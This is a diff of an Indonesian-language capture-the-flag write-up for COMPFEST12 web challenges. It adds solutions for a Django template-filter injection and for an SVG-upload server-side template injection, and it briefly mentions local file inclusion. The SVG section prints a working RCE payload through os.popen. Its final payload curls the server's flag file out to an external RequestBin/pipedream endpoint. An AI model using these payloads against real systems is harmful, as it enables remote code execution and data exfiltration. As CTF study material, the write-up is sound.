@@ -1133,7 +1133,7 @@ Edit cookie jwt-token pada website dengan jwt-token yang baru, refresh dan flag 
 `COMPFEST12{wanjir_gua_lupa_set_debug_nya_jadi_false_79f2622f}`\
 <br/>
 
-## Ketik Ketik [50pts]
+## 4. Ketik Ketik [50pts]
 
 Diberikan website yang berisi game seperti `typeracer`, untuk mendapatkan flag, kita harus menyelesaikannya dibawah 2 detik. Namun setelah scripting dan game diselesaikan kurang dari 2 detik, tepatnya 1.XXX ms, flag tidak didapatkan. Lalu coba tamper requests menggunankan burpsuite, tekan spasi sampai game selesai.
 
@@ -1168,7 +1168,7 @@ Berikut akhir requests data.
 `COMPFEST12{you_sneaky_hacker_you!}`\
 <br/>
 
-## 4. Gekyuel [316pts]
+## 5. Gekyuel [316pts]
 
 Setelah beberapa reccon, didapati terdapat 2 buah field, yaitu games dan developer yang mungkin didalamnya terdapat flag. Lalu, lihat data dalam games dengan query berikut.
 
@@ -1223,7 +1223,7 @@ Flag didapatkan.
 `COMPFEST12{c0nv3n1Ence_i5_A_d0ubL3_eDged_SwoRD!}`\
 <br/>
 
-## NERA [397pts]
+## 6. NERA [397pts]
 
 Local File Inclusion, dengan membaca file `ddududdudu.php` pada `../../../../var/www/html/ddududdudu.php`. Lihat source, file tersebut meng-include file `header.php`
 
@@ -1259,3 +1259,150 @@ $flag = 'COMPFEST12{lOc4l_fiLe_inClusion_f0r_FUN_and_profit_35c28478ab}';
 
 `COMPFEST12{lOc4l_fiLe_inClusion_f0r_FUN_and_profit_35c28478ab}`\
 <br/>
+
+## 7. Super Secure Filter [280pts]
+
+Input asal untuk mentriger error `{{ 4 }}` untuk mengecek apakah debug dihidupkan. Dan ternyata benar debug hidup.
+
+Error dibagian `/code/myapp/views.py in homepage` terdapat sesuatu yang mencurigakan, yaitu terdapat request context `arthropods` yang memiliki `other`.
+
+```py
+context = RequestContext(request, {
+        'arthropods':other,
+        'mammals':'<img src="/static/kucing.jpeg" alt="mammalians" id="kucing" style="width:500px">',
+        'pisces':'<img src="/static/ikan.jpeg" alt="piscesians" id="ikan" style="width:500px">',
+```
+
+Dan terdapat filter `safe` yang kurang baik.
+
+```py    
+data = request.POST.get('data', '')
+a = angkabukan(''.join(data.split()[1:-1]))
+...
+template = Template(TEMP.format( "{{ " + data.split()[1].replace('mammals', 'mammals|safe').replace('pisces', 'pisces|safe').replace('amfibi', 'amfibi|safe') + "|safe }}" + a))
+```
+
+Didapatkan juga fungsi-fungsi yang mempermudah untuk mendapatkan flag pada error `/code/myapp/templatetags/myfilters.py in angkabukan`.
+
+```py
+@register.filter(name='ambildong')
+def ambildong(a, b):
+    return getattr(a, b)
+@register.filter(name='angkabukan')
+def angkabukan(a):
+    return cobacek(a) …
+@register.filter(name='isinya')
+def isinya(a):
+    return dir(a)
+def cobacek(a):
+    try:
+        a = int(a)
+        assert a>0,"woi masa negatif ah yang bener dong"
+        assert a<4,"woi udah dibilang jangan lebih dari 3" …
+        temp = ['{{ mammals|safe }}', '{{ pisces|safe }}','{{ amfibi|safe }}']
+        lst = sample(temp, a)
+        return ''.join(lst)
+    except ValueError:
+        return a
+    ...
+```
+
+Dengan memanfaatkan fungsi `isinya` yaitu dengan payload `{{ arthropods|isinya }}` akan mendapatkan list dir dari `arthropods`.
+
+```py
+['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']arthropods|isinya
+```
+
+Lalu, manfaatkan fungsi `ambildong` untuk memanggil dir dari `arthropods` yang ditemukan flag pada dir `__doc__`.
+
+Payload: `{{ arthropods|ambildong:"__doc__" }}`
+
+```py
+COMPFEST12{djan90_cu5t0m_t3mplat3_f1Lters_d0nt_forg3t_t0_set_debu9_fal5e}
+arthropods|ambildong:"__doc__"
+```
+
+### Flag
+
+`COMPFEST12{djan90_cu5t0m_t3mplat3_f1Lters_d0nt_forg3t_t0_set_debu9_fal5e}`\
+<br/>
+
+
+## 8. Bad Parser Bad Templater [486pts]
+
+Disediakan website yang hanya memiliki fitur upload file svg. Mencoba upload file svg kosong yang valid. Didapati response source sebagai berikut.
+
+```html
+svg 
+<class 'str'><br><br><br>image None <class 'str'><br><br><br>
+```
+
+Template Injection, dengan menambahkan `{{ 2*2 }}` pada svg file.
+
+```html
+svg 
+<class 'str'><br><br><br>image 4 <class 'str'><br><br><br>
+```
+
+Selanjutnya dilakukan template injection dengan menggunakan fungsi dari os module python yaitu `os.popen()` untuk mendapatkan RCE.
+
+```html
+<svg>
+    <image>{{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() }}</image>
+</svg>
+```
+
+Sebelumnya menggunakan `[]` dll, tetapi gagal. Dan mencari-cari payload diinternet `(Internal Server Error)`, didapatkan menggunakan `config` dan berhasil.
+
+```html
+svg 
+     <class 'str'><br><br><br>image total 84
+drwxr-xr-x   1 root root 4096 Aug 28 02:18 .
+drwxr-xr-x   1 root root 4096 Aug 28 02:18 ..
+-rwxr-xr-x   1 root root    0 Aug 28 02:18 .dockerenv
+drwxr-xr-x   1 root root 4096 Aug 28 02:00 app
+drwxr-xr-x   1 root root 4096 Aug  4 23:27 bin
+drwxr-xr-x   2 root root 4096 Jul 10 21:04 boot
+drwxrwxr-x   3 ctf  ctf  4096 Aug 28 01:02 code
+drwxr-xr-x   5 root root  340 Aug 28 02:21 dev
+drwxr-xr-x   1 root root 4096 Aug 28 02:18 etc
+drwxr-xr-x   1 root root 4096 Aug 28 02:00 home
+drwxr-xr-x   1 root root 4096 Aug  4 23:27 lib
+drwxr-xr-x   2 root root 4096 Aug  3 07:00 lib64
+-rw-rw-r--   1 root root   40 Aug 25 03:20 loooool_ini_lho_fl4gnya
+drwxr-xr-x   2 root root 4096 Aug  3 07:00 media
+drwxr-xr-x   2 root root 4096 Aug  3 07:00 mnt
+drwxr-xr-x   2 root root 4096 Aug  3 07:00 opt
+dr-xr-xr-x 505 root root    0 Aug 28 02:21 proc
+drwx------   1 root root 4096 Aug 28 02:00 root
+drwxr-xr-x   3 root root 4096 Aug  3 07:00 run
+drwxr-xr-x   1 root root 4096 Aug  4 23:26 sbin
+drwxr-xr-x   2 root root 4096 Aug  3 07:00 srv
+dr-xr-xr-x  13 root root    0 Aug 28 02:21 sys
+drwxrwxrwt   1 root root 4096 Aug 28 03:43 tmp
+drwxr-xr-x   1 root root 4096 Aug  3 07:00 usr
+drwxr-xr-x   1 root root 4096 Aug  3 07:00 var
+ <class 'str'><br><br><br>
+```
+
+Mencoba `cat /loooool_ini_lho_fl4gnya` didapati website `Internal Server Error`. Ternyata kita tidak bisa stdout pada website.
+
+Lalu, dilakukan upload file flag ke server. Pertama, dengan membuat endpoint requests dulu dengan RequestsBin.
+
+Setelah itu, upload file flag menggunakan `curl` dari server, berikut final payloadnya.
+
+```html
+<svg>
+    <image>{{ config.__class__.__init__.__globals__['os'].popen('curl https://c6d3e760ca0abf721ac9c4ffb61a5ed0.m.pipedream.net --upload-file /loooool_ini_lho_fl4gnya').read() }}</image>
+</svg>
+```
+
+Setelah berhasil, cek pada RequestBin dan didapatkan flag.
+
+![FLAG](https://abdullahnz.github.io/assets/images/WEB-8.png)
+
+### Flag
+
+`COMPFEST12{u_r_the_real_mvp_x0x0_uWWWu}`\
+<br/>
+
